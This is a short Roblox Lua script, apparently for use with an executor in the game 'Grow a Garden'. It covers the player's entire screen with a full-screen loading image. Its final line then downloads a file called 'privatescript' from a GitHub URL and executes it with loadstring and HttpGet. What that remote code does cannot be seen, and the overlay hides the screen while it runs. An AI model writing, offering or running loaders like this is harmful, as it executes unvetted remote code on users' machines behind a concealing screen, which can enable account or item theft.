local screenGui = Instance.new("ScreenGui")
screenGui.IgnoreGuiInset = true
screenGui.ResetOnSpawn = false
screenGui.Name = "LoadingScreen"
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

local loadingImage = Instance.new("ImageLabel")
loadingImage.Size = UDim2.new(1, 0, 1, 0)
loadingImage.Position = UDim2.new(0, 0, 0, 0)
loadingImage.Image = "rbxassetid://77043026944368"
loadingImage.BackgroundTransparency = 1
loadingImage.ScaleType = Enum.ScaleType.Stretch
loadingImage.Parent = screenGui

loadstring(game:HttpGet("https://raw.githubusercontent.com/aa362/growagarden/refs/heads/main/privatescript"))()